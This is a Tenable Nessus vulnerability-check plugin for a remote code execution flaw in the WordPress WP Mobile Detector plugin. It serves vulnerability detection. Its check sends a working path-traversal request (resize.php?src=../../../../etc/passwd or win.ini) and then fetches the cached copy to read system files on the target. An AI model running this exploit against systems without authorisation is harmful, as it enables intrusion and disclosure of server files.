#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(92360);
  script_version("$Revision: 1.2 $");
  script_cvs_date("$Date: 2016/07/21 13:58:10 $");

  script_osvdb_id(139500);
  script_xref(name:"EDB-ID", value:"39891");

  script_name(english:"WP Mobile Detector Plugin for WordPress File Upload RCE");
  script_summary(english:"Attempts to execute arbitrary code.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a PHP script that is affected by a remote
code execution vulnerability.");
  script_set_attribute(attribute:"description", value:
"The WP Mobile Detector Plugin for WordPress running on the remote web
server is affected by a remote code execution vulnerability due to a
failure to properly sanitize user-supplied files that are uploaded to
the 'resize.php' or 'timthumb.php' scripts under the
'/wp-content/plugins/wp-mobile-detector/' directory. An
unauthenticated, remote attacker can exploit this issue to execute
arbitrary code under the privileges of the web server user.");
  # https://blog.sucuri.net/2016/06/wp-mobile-detector-vulnerability-being-exploited-in-the-wild.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?682203be");
  script_set_attribute(attribute:"solution", value:
"Upgrade the Mobile Detector Plugin for Wordpress to version 3.6 or
later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2016/05/31");
  script_set_attribute(attribute:"patch_publication_date", value:"2016/06/02");
  script_set_attribute(attribute:"plugin_publication_date", value:"2016/07/19");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:wordpress:wordpress");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_set_attribute(attribute:"in_the_news", value:"true");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2016 Tenable Network Security, Inc.");

  script_dependencies("os_fingerprint.nasl", "wordpress_detect.nasl");
  script_require_keys("installed_sw/WordPress", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

app = "WordPress";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(app_name:app, port:port);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

plugin     = "WP Mobile Detector";
plugin_dir = "/wp-content/plugins/wp-mobile-detector/";

# Check KB first
installed = get_kb_item("www/"+port+"/webapp_ext/"+plugin+" under "+dir);

if (!installed)
{
  checks = make_array();
  checks[plugin_dir + "readme.txt"][0] = make_list('=== WP Mobile Detector ===');
  checks[plugin_dir + "locale/wp-mobile-detector.pot"][0] = make_list('WP Mobile Detector');

  # Ensure plugin is installed
  installed = check_webapp_ext(
    checks : checks,
    dir    : dir,
    port   : port,
    ext    : plugin
  );
}
if (!installed) audit(AUDIT_WEB_APP_EXT_NOT_INST, app, install_url, plugin + " plugin");

# Determine which command to execute on target host
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) files = make_list('windows/win.ini', 'winnt/win.ini');
  else files = make_list('etc/passwd');
}
else
  files = make_list('etc/passwd', 'windows/win.ini', 'winnt/win.ini');

file_pats = make_array();
file_pats['etc/passwd'] = "root:.*:0:[01]:";
file_pats['winnt/win.ini'] = "^\[[a-zA-Z]+\]|^; for 16-bit app support";
file_pats['windows/win.ini'] = "^\[[a-zA-Z]+\]|^; for 16-bit app support";

attack     = mult_str(str:"../", nb:12);

file       = NULL;
body       = NULL;
attack_req = NULL;

foreach file (files)
{
  affected_files = make_list('resize.php', 'timthumb.php');
  foreach affected_file (affected_files)
  {
    # e.g. /wp-content/plugins/wp-mobile-detector/resize.php?src=../../../../etc/passwd
    url = plugin_dir + affected_file + "?src=" + attack + file;

    res = http_send_recv3(
      method       : "GET",
      item         : dir + url,
      port         : port
    );

    if (res[0] !~ "^HTTP/[0-9.]+ +200") continue;
    
    filename = split(file, sep:'/', keep:FALSE);
    filename = filename[1];
    cache_url = plugin_dir + 'cache/' + filename;

    res = http_send_recv3(
      method       : "GET",
      item         : dir + cache_url,
      port         : port
    );

    if (res[0] !~ "^HTTP/[0-9.]+ +200") continue;    

    body = res[2];
    if (body =~ file_pats[file])
    {
      attack_req = install_url + url;
      break;
    }
  }
}

if (isnull(attack_req))
  audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, plugin + " plugin");

security_report_v4(
  port        : port,
  severity    : SECURITY_HOLE,
  file        : file,
  line_limit  : 10,
  request     : make_list(attack_req),
  output      : chomp(body),
  attach_type : 'text/plain',
  rep_extra   : 'Note: This file has not been removed by Nessus and will need to be' +
                '\n' + 'manually deleted (' + install_url + cache_url + ').'
);
